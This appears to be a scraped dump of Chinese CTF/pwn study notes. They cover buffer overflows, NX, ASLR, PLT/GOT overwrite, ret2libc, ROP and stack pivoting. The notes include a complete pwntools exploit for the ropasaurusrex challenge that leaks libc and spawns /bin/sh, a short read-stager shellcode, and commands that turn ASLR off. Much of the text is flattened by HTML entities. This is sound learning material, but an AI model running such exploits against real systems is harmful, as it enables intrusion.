exploit模板大概是这样(使用pwntools)： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: utf-8 -*-from pwn import *context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;)context.log_level &#x3D; &#39;debug&#39; # output verbose logRHOST &#x3D; &quot;localhost&quot;RPORT &#x3D; 8080LHOST &#x3D; &quot;127.0.0.1&quot;LPORT &#x3D; 8080# libc &#x3D; ELF(&#39;&#39;)elf &#x3D; ELF(&#39;.&#x2F;babyfirst-heap&#39;)def section_addr(name, elf&#x3D;elf): return elf.get_section_by_name(name).header[&#39;sh_addr&#39;]conn &#x3D; Noneif len(sys.argv) &gt; 1: if sys.argv[1] &#x3D;&#x3D; &#39;r&#39;: conn &#x3D; remote(RHOST, RPORT) elif sys.argv[1] &#x3D;&#x3D; &#39;l&#39;: conn &#x3D; remote(LHOST, LPORT) elif sys.argv[1] &#x3D;&#x3D; &#39;d&#39;: execute &#x3D; &quot;&quot;&quot; # set environment LD_PRELOAD&#x3D; #b *&#123;0&#125; #b *0x8048afa ignore 2 0x0a c &quot;&quot;&quot;.format(hex(elf.symbols[&#39;main&#39;] if &#39;main&#39; in elf.symbols.keys() else elf.entrypoint)) conn &#x3D; gdb.debug([&#39;.&#x2F;babyfirst-heap&#39;], execute&#x3D;execute)else: conn &#x3D; process([&#39;.&#x2F;babyfirst-heap&#39;])# conn &#x3D; process([&#39;.&#x2F;heap&#39;], env&#x3D;&#123;&#39;LD_PRELOAD&#39;: &#39;&#39;&#125;)# preparing for exploitationlog.info(&#39;Pwning&#39;)payload &#x3D; &quot;&quot;conn.sendline(payload)conn.interactive() pwntools使用方法参见官方文档及其他公开资料 信息收集 编写exploit之前需要先收集二进制地址等信息 可以使用各种命令来收集信息 调查各种PLT/GOT $ objdump -d -M intel ropasaurusrex | grep &quot;@plt&gt;:&quot; -A1 pop×N gadget 调查 123$ gdb .&#x2F;ropasaurusrex –qgdb-peda $ startgdb-peda $ ropgadget 地址固定的RW区域(.data)调查 $ readelf -S ropasaurusrex | fgrep .data libc中的system偏移 $ ldd ropasaurusrex (首先获取使用的libc路径) $ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot; (在对应libc中调查) 12345678## 组合攻击流1. 通过write泄漏某处GOT的地址 将write(STDOUT, got_write, 4)加载到stack上2. 通过泄漏的地址计算出system@libc的地址 libc_base = u(f.read(4)) - offset_write libc_system = libc_base + offset_system 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647483. 在某处生成字符串&quot;&#x2F;bin&#x2F;sh\\0&quot; 将read(STDIN, .data, 8)加载到stack上4. 将某个GOT重写为system@libc 将read(STDIN, got_write, 4)加载到stack上5. 使用参数&quot;&#x2F;bin&#x2F;sh&quot;调用被修改GOT的函数 将write(.data)加载到stack上，这等价于system(&quot;&#x2F;bin&#x2F;sh&quot;)也就是说，整个流程要加载到stack伤的数据如下：![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041801.jpg)- 发送这段数据，会调用plt_write() ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041802.jpg)- 通过plt_write()泄漏地址，攻击者可以获取4个字节 ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041803.jpg)- 根据获取的数据计算出system的地址 ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041804.jpg)- 因为二进制程序正在等待数据读取，首先准备&quot;&#x2F;bin&#x2F;sh&quot; ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041805.jpg)- 再次读取，使用计算出的system地址重写write@got ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041806.jpg)- 通过GOT Overwrite使得write&#x3D;system，之后调用write(.data) ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041807.jpg)- 实际调用的是system(&quot;&#x2F;bin&#x2F;sh&quot;)，getshell ![img](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019041808.jpg)## exploit最终完整exploit代码如下： #!/usr/bin/python # -*- coding: utf-8 -*- from pwn import * context(os=’linux’, arch=’i386’) context.log_level = ‘debug’ # output verbose logRHOST = “localhost”RPORT = 1025LHOST = “127.0.0.1”LPORT = 1025 libc = ELF(‘’)elf = ELF(‘./ropasaurusrex’) def section_addr(name, elf=elf): return elf.get_section_by_name(name).header[‘sh_addr’] conn = Noneif len(sys.argv) &gt; 1: if sys.argv[1] == ‘r’: conn = remote(RHOST, RPORT) elif sys.argv[1] == ‘l’: conn = remote(LHOST, LPORT) if &apos;main&apos; in elf.symbols.keys() else elf.entrypoint)) conn = gdb.debug([&apos;./ropasaurusrex&apos;], execute=execute)else: conn = process([‘./ropasaurusrex’]) preparing for exploitationwrite_plt = 0x0804830cread_plt = 0x0804832cpop3ret = 0x80484b6write_got = 0x8049614read_got = 0x804961cdata = 0x08049620system_offset = 0x0003d200write_offset = 0x000e6d80 log.info(‘Pwning’) buf = ‘A’ * 140 write(STDOUT, got_write, 4)buf += p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4) read(STDIN, data, 8)buf += p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8) read(STDIN, got_write, 4)buf += p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4) write(data) # system(“/bin/sh”)buf += p32(write_plt) + p32(0xdeadbeef) + p32(data) conn.sendline(buf)ret = u32(conn.recv())print(‘write@got: {}’.format(hex(ret)))print(‘libc_start: {}’.format(hex(ret - write_offset)))system_addr = ret - write_offset + system_offsetprint(‘system: {}’.format(hex(system_addr))) conn.send(‘/bin/sh’+’\\x00’) buf = p32(system_addr)conn.send(buf) conn.interactive() 按照上述动态调试环境测试运行，pwned： {% image https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041901.jpg 'img' '' %}","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记14:stack pivot与Off-by-one","slug":"Pwn学习笔记14-stack-pivot与Off-by-one","date":"2019-04-15T05:56:33.000Z","updated":"2019-04-15T06:00:05.310Z","comments":true,"path":"2019/04/15/Pwn学习笔记14-stack-pivot与Off-by-one/","link":"","permalink":"https://darkwing.moe/2019/04/15/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B014-stack-pivot%E4%B8%8EOff-by-one/","excerpt":"","text":"ROP的问题点ROP需要一个较大的溢出缓冲区 因为只包含一些细分的小指令，要发送的数据不可避免的增加 如果在srack返回地址下没有较大的溢出，就会很糟糕 如果没有足够的溢出缓冲区该怎么办？ stack pivot 溢出量问题绕过 - stack pivot stack pivot 使用ret2plt等将后续ROP加载到bss(适当区域) 通过pop ebp; ret来调整EBP寄存器 通过leave; ret来任意更改ESP leave是「mov esp, ebp; pop ebp」之类的值 bss作为stack继续ROP stack pivot的注意事项 使用bss作为stack发动ROP，可能会失败 调用system()之前出现SIGSEGV 调用system()时也可能出现SIGSEGV 这是因为(后续ROP使用的GOT等)必要的变量被破坏，以及跳到stack等原因 因为read/write时，系统内的dl_fixup函数对stack做了很好的保护 pivot使用的stack，应该设置在.bss的中间，而不是靠近顶部 建议使用bss+0x800左右的区域 Off-by-one 栈溢出 栈溢出的椅子红，但只溢出一个字节 只可能覆盖Old-EBP的低位一个字节 这里也能使用stack pivot 因为可以更改Old-EBP，因此可以在这个函数返回后控制ebp 另外，当从那里返回时，可以更改stack伤的返回地址 只要函数使用leave或者等效的命令 由于stack地址根据环境而变化，因此很难完全预测一字节的溢出值 但总共可以使用256次 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex GOT overwrite Plaid CTF 2013 - pwn200 - ropasaurusrex ROP Hack.lu CTF 2012 - pwn300 – braincpy stack pivot Hack.lu CTF 2012 - pwn300 – braincpy","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记13:ROP与DROP","slug":"Pwn学习笔记13-ROP与DROP","date":"2019-04-12T06:58:54.000Z","updated":"2019-04-12T06:59:23.041Z","comments":true,"path":"2019/04/12/Pwn学习笔记13-ROP与DROP/","link":"","permalink":"https://darkwing.moe/2019/04/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B013-ROP%E4%B8%8EDROP/","excerpt":"","text":"ASLR绕过 - 方式2在ASLR中，并非所有地址都是随机的 也可以利用.text区域 NX+ASLR绕过2 - ROPROP(Return Oriented Programming) 狭义：想要执行的代码细分后在.text区域搜索合并 RX权限，即能够执行的只有.text区域，因此想办法使用.text区域 广义：除了狭义的ROP之外，也包括ret2plt/ret2libc之类的伪造返回地址的方法 细分的代码叫做gadget，rop gadget 例如下面的代码，可以对eax进行+1操作 寻找rop gadget很多工具，例如ROPgadget img 其他工具例如msfrop，rp++，Ropeme，ropper NX+ASLR绕过3 - DROPDROP(Dynamic ROP) .text区域的gadget很少时的情况 基于泄漏的libc地址，使用libc中的gadget构造ROP 因为libc相对比较大，其中的gadget非常多 在泄漏libc地址的大部分情况中非常有效 前提是指导目标环境的libc版本","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记12:ASLR与memory leak","slug":"Pwn学习笔记12-ASLR与memory-leak","date":"2019-04-12T06:21:27.000Z","updated":"2019-04-12T06:22:10.378Z","comments":true,"path":"2019/04/12/Pwn学习笔记12-ASLR与memory-leak/","link":"","permalink":"https://darkwing.moe/2019/04/12/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B012-ASLR%E4%B8%8Ememory-leak/","excerpt":"","text":"ret2libc对策 – ASLRASLR(Address Space Layout Randomization) 主要是地址随机化 现代Linux内核中默认开启 ret2libc成功的原因是，libc之类的读取地址是固定的 因此如果每次运行时，libc之类的地址随机，是一个比较好的方式 miao# echo 2 &gt; /proc/sys/kernel/randomize_va_space miao# ldd stack6 | grep libc libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d94000) miao# ldd stack6 | grep libc libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dd4000) 如上所示，每次运行地址都不同 ASLR绕过 - 方式1ASLR中，并非所有地址都是随机的 PLT/GOT之类的地址是固定的，可以利用这一点 实际的内存映射大概是这样 红框中是固定地址，PLT和GOT在这里 GOT中存储ASLR随机化后的地址 因此出现了有名的的根据这些信息计算libc地址的方法 GOT leak GOT中包含重要地址 printf的外部地址 如果能够读取更新后的(printf@got.plt)这个值，那么就可能计算出libc.so的加载地址 GOT overwrite 因为GOT位于RW区域，因此可能覆写 使用某种漏洞将printf的GOT替换为另一个地址 默认情况下可以重写GOT的值。通过某种方式将其修改为其他函数的地址，当调用printf函数的时候会调用修改后的其他函数。这种方式叫做GOT overwrite。 NX+ASLR绕过1 – memory leak + ret2plt + GOT overwrite 假设存在栈溢出 通过ret2plt等方式，显示出printf@got的地址(write) 泄漏地址 攻击者可以通过泄漏的地址计算libc的基地址，加上偏移量计算出system的地址 通过ret2plt等方式，向printf@got读入system的地址(read) 下次调用printf的时候，会实际调用system 其他的泄漏除GOT leak之外，其他能够泄漏libc地址的情况 通过(Stack/Heap)缓冲区溢出读取造成的泄漏 无序参考，负数索引，类型(主要是结构体)的混淆导致的泄漏 字符串末尾无终止字符造成的泄漏 格式化字符串问题 Use After Free，Double Free 条件竞争等 通过泄漏想要获取的值 stack区域上__libc_start_main的返回地址 指向bss区域中与libc相关的变量的指针（例如FILE *之类的） 指向堆管理区域(元数据)中的bin/fastbins的指针 bin/fastbins无任何连接时适用 与libc相关的所有其他地址 其他的指针GOT之外其他可写的函数指针 C++ class的vtable 在C++中，class有method，在内部实现了一个函数指针表 .fini_array(旧的.dtor区域) gcc编译具有__attribute__((destructor))的函数时,会在这里注册 由atexit()注册的列表 明确指定析构函数时的函数指针 但是它与Thread Local Storage中奇怪的值XOR(PTR_MANGLE)之后进行注册","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记11:ret2libc","slug":"Pwn学习笔记11-ret2libc","date":"2019-04-09T06:40:26.000Z","updated":"2019-04-09T06:41:11.055Z","comments":true,"path":"2019/04/09/Pwn学习笔记11-ret2libc/","link":"","permalink":"https://darkwing.moe/2019/04/09/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B011-ret2libc/","excerpt":"","text":"ret2plt链的问题点 如果想要使用的函数不在PLT中，则无法构成链 ret2libc img 绕过NX2 - ret2libc想要使用的函数不在PLT时，应该怎么办？ 源代码中未使用的函数，在二进制程序中不会有PLT入口 也就是说，我们无法通过PLT代理到函数地址 即使没有PLT入口，但如果内存地址正确，也可以直接调用函数(至少libc中的函数可以这样) 如果能够知道system函数的地址，那么就能够调用它 怎样才能知道地址？ 首先，了解下ASLR miao# echo 0 &gt; /proc/sys/kernel/randomize_va_space miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dda000) miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dda000) miao# echo 2 &gt; /proc/sys/kernel/randomize_va_space miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d45000) miao# ldd heap | grep libc.so libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d8e000) miao# 在ASLR关闭的情况下，无论运行多少次，读取到的目标地址都是不变的(这里练习环境关闭了ASLR) 对于不同的环境和二进制文件，该地址可能不同，但大体上相似(0xf7XXXXXX这种) 但是，32位机器上的结果和在64位机器上运行32位程序的结果不同 32位机器，0xb7XXXXXX 64位机器运行32位程序，0xf7XXXXXX 这是因为64位机器中内核区域的映射地址不是0xc0000000~(大概) libc.so中的偏移地址，在文件中和内存中都是固定的 libc.so的文件内容以完全相同的方式映射到内存 也就是说，我们只需要加上基地址 因此 使用objdump预先检查函数的偏移量 例如，system()的偏移是0x40190，如果对方的libc与自己的libc一致，那么内存中的地址就是0xf7e21000 + 0x40190 但是，如果环境不同，可能会有轻微的区别 检查libc中的函数地址 # ldd heap (首先检查正在使用的libc路径) objdump -d /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot; (检查这个libc) 检查libc中特定字符串的地址 strings -tx /lib/i386-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot; 预先检查得到了system()和”/bin/sh”的地址，将他们加载到stack中 “/bin/sh”类似的字符串也在libc.so中 如果环境不同，可能会有偏差 但是，即使环境不同，加载目标地址也只会以0x1000的增量变化 您可以以0x1000为增量进行暴力枚举 0xf7e61190, 0xf7e62190, 0xf7e63190, … 那么，问题来了 对方环境必须要是特定的libc 需要提前调查各种偏移地址 这考察了侦察能力 需要识别对方环境具体事什么版本的libc 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex ret2libc Plaid CTF 2013 - pwn200 - ropasaurusrex","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"MacOS下编译使用php_mt_seed","slug":"MacOS下编译使用php-mt-seed","date":"2019-04-09T03:17:47.000Z","updated":"2019-04-09T03:32:08.556Z","comments":true,"path":"2019/04/09/MacOS下编译使用php-mt-seed/","link":"","permalink":"https://darkwing.moe/2019/04/09/MacOS%E4%B8%8B%E7%BC%96%E8%AF%91%E4%BD%BF%E7%94%A8php-mt-seed/","excerpt":"","text":"下载源码包https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz 编译直接编译会报错，缺少openmp 可以去掉这个选项编译，但这样会只能单核跑： 安装llvm和libomp： brew install llvm libomp 之后使用llvm的clang进行编译，报错： 这是因为macOS SDK headers不在/usr/include里，可以使用 1open &#x2F;Library&#x2F;Developer&#x2F;CommandLineTools&#x2F;Packages&#x2F;macOS_SDK_headers_for_macOS_10.14.pkg 将其安装到默认/usr/include里 之后继续编译，提示一个warning编译选项，加了之后反而不能用： 默认编译选项就可以：","categories":[],"tags":[]},{"title":"Pwn学习笔记10:PLT,GOT与ret2plt","slug":"Pwn学习笔记10-PLT-GOT与ret2plt","date":"2019-04-03T07:14:34.000Z","updated":"2019-04-08T01:30:35.095Z","comments":true,"path":"2019/04/03/Pwn学习笔记10-PLT-GOT与ret2plt/","link":"","permalink":"https://darkwing.moe/2019/04/03/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B010-PLT-GOT%E4%B8%8Eret2plt/","excerpt":"","text":"PLT与GOTPLT(Procedure Linkage Table)与GOT(Global Offset Table) ELF文件调用库函数时，存在PLT入口和GOT入口 注意，静态链接库没有这些 是一种在libc.so等动态查找外部函数地址的机制 PLT解析外部地址，之后保存(缓存)在GOT中 如果有PLT入口，就可以在不知道函数实际地址的情况下去调用它 PLT作为代理跳转到真实地址 PLT中的实体是汇编代码，作为缓冲函数存在 什么时候存在PLT？ 函数的PLT入口存在的条件是，在预编译代码中使用该函数 某些情况下，gcc优化或者FORTIFY_SOURCE会变更函数，这里暂不考虑 也就是说，经常使用的printf存在PLT入口 PLT在ELF中的固定地址 即使开启ASLR，地址也是固定的 但是，如果PIE也开启，它会变化 如果有PLT入口，就能够进行ret2plt 可以通过objdump，readelf等检查PLT/GOT入口的地址（以下是示例）objdump -d -M intel stack3 | grep &quot;@plt&gt;:&quot; -A1 左边是PLT，右边是GOT ret2plt, ret2popret2plt 如果PLT与参数，返回地址等一起加载于stack上，则无法与正常的函数调用区分开 PLT不会检查调用来源 例如使用mmap的PLT，获取具有RWX权限的内存(假设存在mmap@plt) void*mmap(void*addr,size_tlength,intprot,intflags,intfd,off_toffset); 但是，这并不能读取额外的内容 我们想在mmap之后执行read(也就是说想要多次调用函数) ret2pop 使用pop从stack中除去参数 pop = 从stack中取出一个元素(4个字节)，存放在寄存器中 stack减小(=esp指向的地址增大) 代码中pop×N;找到ret(也可以用add esp，同样N次) 像这个例子，pop6次，称为p6ret, pop6ret等 NX绕过方式1 - ret2plt链 熟练使用ret2pop，可以构造出ret2plt链 例如 使用mmap在合适的固定地址获取RWX内存 对该区域使用read()读入shellcode 返回到该区域执行shellcode 按照mmap -&gt; read -&gt; shellcode的调用顺序 并不是直接执行shellcode 换句话说，这也是一种Stager ret2plt - 信息收集方法 对于”pop×N; ret”地址的查找，可以使用gdb-peda秒杀 使用gdb读取该二进制程序 start(或者run)，然后输入ropgadget 例如pop4ret是这样的命令列表，确实是4个pop之后ret 目前为止的技术总结 技术 推荐练习的问题 nop-sled CodeGate 2013 - pwn100 brute force CodeGate 2013 - pwn100 ret2esp CSAW CTF 2012 - pwn300 - 4842 stager Hack.lu CTF 2012 - pwn300 - braincpy ret2plt Plaid CTF 2013 - pwn200 - ropasaurusrex ret2pop Plaid CTF 2013 - pwn200 - ropasaurusrex","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记9:栈溢出及NX","slug":"Pwn学习笔记9-栈溢出及NX","date":"2019-04-02T06:44:47.000Z","updated":"2019-04-02T06:46:00.268Z","comments":true,"path":"2019/04/02/Pwn学习笔记9-栈溢出及NX/","link":"","permalink":"https://darkwing.moe/2019/04/02/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B09-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8F%8ANX/","excerpt":"","text":"漏洞类型及攻略方法全写出来不太可能，图示大概这样： Stack以x86环境为例 每个进程在内存区域底部都有一个stack 上半部分是在32位机器中运行32位程序 下半部分是在64位机器中运行32位程序 它与C语言函数密切相关12345678910int main(void)&#123; int a, b; .. func(a, b); .. return 0; &#125;void func(int a, int b)&#123; int x, y; ..&#125; 例如，调用这个函数时stack状态如下： ESP/EBP不容易理解，这里解释一下 ESP寄存器始终指向栈顶 EBP寄存器始终指向栈底 EBP-0x8能偶访问本地变量2 EBP-0x4能够访问本地变量1 EBP+0x8能够访问参数1 EBP+0xC能够访问参数2 调用原函数也有相同的帧并保存EBP寄存器，当函数被调用时，EBP会以新的帧为基础更新。因此，调用原函数的帧暂时保存到stack中 栈溢出对策及解决方法 首先来看经典问题 曾经，stack和heap都是有X权限的 BOF:buffer overflow 写入数据超出区域 覆盖写入后续区域 例如这段代码： int main(void){ int a, b; .. func(a, b); .. return 0; } void func(int a, int b){ char buf1[4]; char buf2[4]; strcpy(buf2,&quot;AAAABBBB&quot;); } 123456789101112 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040108.jpg)- 如果用户可以输入任意值，会发生什么？ - 如果没有size限制，就可以任意进行覆盖 - 甚至可以指定返回地址 - 例如这段代码： - int main(void){ int a; char s[256]; .. read(stdin, s, 256); func(a, s); .. return 0; } void func(int a, char* s){ char buf1[4]; char buf2[4]; strcpy(buf2, s); } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040109.jpg)- 添加shellcode - 如果Evil Return addr指向shellcode - 那么返回前会执行shellcode并执行shell(&#x2F;bin&#x2F;sh) - 可以执行任意代码 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040110.jpg)## 1-猜测地址- stack地址是动态的，取决于环境 - 如何让它到达shellcode ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040111.jpg)- 可以略微转移 - nop-sled - nop &#x3D; 0x90(空指令) - 尽可能多的拼接 - 如果到达nop-sled的某个地方，shellcode将自动执行- 多次尝试 - brute force - 如果不知道地址，那么可以尝试所有的可能 - 结合使用nop-sled可以减少尝试次数 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040112.jpg)## 2-溢出量的问题- 考虑不能过多溢出的情况 - nop-sled无法准备好(或者太短了) - 不能猜测地址- brute force需要太长时间 - 如果运气好的话，能够执行shellcode - 实践中很少会成功 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040201.jpg)- 使用保存栈地址的ESP比较好- ret2esp - 但是，如果代码中没有jmp esp或者call esp就很糟糕 - 实际上很可能找不到 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040202.jpg)## 3-溢出量的问题- 只能够少量溢出的情况 - nop-sled无法构造 - 甚至连填充shellcode都不够 ![](https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;zjicmDarkWing&#x2F;images&#x2F;master&#x2F;2019040203.jpg)- 可以使用较短的代码来读取后面更多内容 - Stager - 通过溢出写入较短的汇编代码 - 先运行这部分代码，读取其他shellcode - 通过读取的内容来控制程序运行流程 - 具体大概像这样( 只有17个byte)： - push byte 0x3 ; eax = NR_read pop eax push byte 0x4 ; ebx = fd pop ebx push byte 0xff; edx = size pop edx call next next: pop ecx ; ecx = buf(=ret_addr) int 0x80 ; read(fd, buf, size) stager的优点 使用Shellcode时，目的是首先执行Stager 如果Stager移动，Shellcode也会移动 因为它很短，很容易绕过限制 可以轻松更改后续shellcode 对策 - Stack不可执行(NX)如果stack和heap不能执行就太好了 这就是NX(No eXecute / Never eXecute) 有各种实现，例如NX比特位，PaX，Exec Shield(Redhat)等 硬件实现或软件实现 结果都是让stack之类不可执行 考虑绕过NX 该怎么做 (例)创建可写的固定地址，编写shellcode并执行 通过mmap或者mprotect获取RWX权限的内存区域 在那里写入shellcode并返回 问题点 如何调用到mmap/mprotect？ 通过溢出如何写入到那里 溢出是在栈向下写入的攻击 不能够反向写入 ret2plt 让栈的状态，在函数调用的瞬间是相同的(非常重要的概念)","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记:总结01","slug":"Pwn学习笔记-总结01","date":"2019-04-01T05:34:17.000Z","updated":"2019-04-01T05:35:20.660Z","comments":true,"path":"2019/04/01/Pwn学习笔记-总结01/","link":"","permalink":"https://darkwing.moe/2019/04/01/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%80%BB%E7%BB%9301/","excerpt":"","text":"总结 这一次，主要解决与堆密切相关的漏洞 还有很多其他类型的漏洞 例如栈溢出，很有名并且很容易找到 条件竞争，整数溢出这类稍微有点难找 简单介绍一下其他漏洞 其他类型的漏洞栈缓冲区溢出 当输入数据超出栈上分配的内存末尾时，会产生这种溢出 可以通过重写返回地址来控制后续操作 如果启用了canary保护，那么会检测到stack被更改 特别情况，仅能超出一个元素，被称为Off-By-One Stack Buffer Overflow。这种情况下只能重写ebp/rbp等，需要进行栈调整 堆缓冲区溢出 当输入的数据超出堆上分配的内存末尾时，会产生这种溢出 虽然不能重写返回地址，但是可以重写例如函数指针，数据等来控制后续操作 如果可以重写内存管理区域，则可以通过重写链表的next地址或者prev地址，向任意内存地址写入任意数据(之后会详细说明) 用户可控数据 这是导致溢出产生的现实原因，输入的数据由用户指定，而缓冲区是固定size，向固定size的缓冲区发送任意size的数据，就导致了溢出 这也能够导致Buffer Over Read 变更连接攻击(Unlink attack) 通过堆溢出，能够重写堆上的malloc管理数据(被称为chunk)，通过free()的时候进行unlink处理，就更改了next或者prev到能够RWX的任意内存，可以写入任意数据 还可以进行GOT Overwrite fastbins attack malloc/free时，可能进行fastbins attack malloc的返回地址能够任意指定，就产生了漏洞 字符串末尾NULL消除(Unterminated Null-Terminated String) C语言中的字符串是数组，如果没有结尾的NULL字符(=’\\0’)，那么在显示字符串时也会将后面的内容显示出来，造成信息泄漏 在这种情况下嘛，可以获得堆，栈，libc或者PIE的基地址，并且在某些情况下，可能泄漏例如用于加密/解密的密钥之类的重要信息 这可能是一个意外的长度，也会导致溢出 内存释放后的使用(Use After Free) 在malloc的内存被释放后，再次向该地址呢写入数据会发生这种情况 如果该地址已经被别的功能所使用，则可以重写改地址的数据 内存二次释放(Double Free) malloc申请的内存进行释放后，再次释放相同的地址 如果在第一次和第二次释放之间，这个地址被其他用途X获取到，那么第二次也会释放掉这个地址 那么，X在使用它时，堆中的数据可能会严重受损，因为它使用已经被释放的地址 类型混淆(Type Confusion) 在使用多种结构体/类的情况下，如果用户可以选择要应用的结构/类，错误的应用可能导致溢出及函数指针覆盖 格式化字符串漏洞(FSB: Format String Bug) 在printf系列函数中，如果使用printf(input)这类写法，攻击者就能够控制参数格式。正确的写法应该是printf(“%s”,input). 例如使用%p或者%x之类的转换说明符，可能泄漏stack上的值。即使是在ASLR/PIE环境下也可以置顶栈地址。 另外，如果用户输入在栈上，则可以输出该值地址，并以此为基础，向栈的内存地址写入数据 此外，%12345x这类指定字符宽度规范，可以自由指定printf输出的字符数。通过这个可能向任意内存地址写入任意值 覆盖stack或者GOT，重写数据或者函数指针，利用方式有很多 FORTIFY_SOURCE(使用printf_chk之类的chk)情况下，无法使用%n 基于堆的FSB 格式化字符串攻击困难，用户输入不在stack上的情况 